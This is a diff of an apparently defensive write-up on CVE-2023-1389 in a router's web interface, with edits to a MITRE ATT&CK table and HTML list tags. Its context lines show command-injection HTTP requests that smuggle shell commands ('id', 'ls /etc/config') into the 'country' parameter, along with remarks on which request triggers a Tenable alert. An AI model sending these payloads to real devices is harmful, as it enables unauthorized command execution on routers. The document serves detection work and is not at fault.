@@ -50,7 +50,7 @@ We can leverage this vulnerability to execute commands on the router. To solve t
 <td>Identify Firmware Version</td>
 <td>Discovery</td>
 <td>T1082</td>
-<td>System Information DIscovery</td>
+<td>System Information Discovery</td>
 </tr>
 <tr>
 <td>Exploit CVE-2023-1389</td>
@@ -92,10 +92,12 @@ operation=write&country=$(id>/tmp/out)
 </code></pre>
 <ul>
 <li>This is the request included in the Tenable alert, which ultimately does not fire</li>
+</ul>
 <pre><code class="language-http">
 POST /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(ls%20/etc/config) HTTP/1.1  
 Host: [target router] 
 </code></pre>
+<ul> 
 <li>This request fires</li>
 </ul>
 <br>
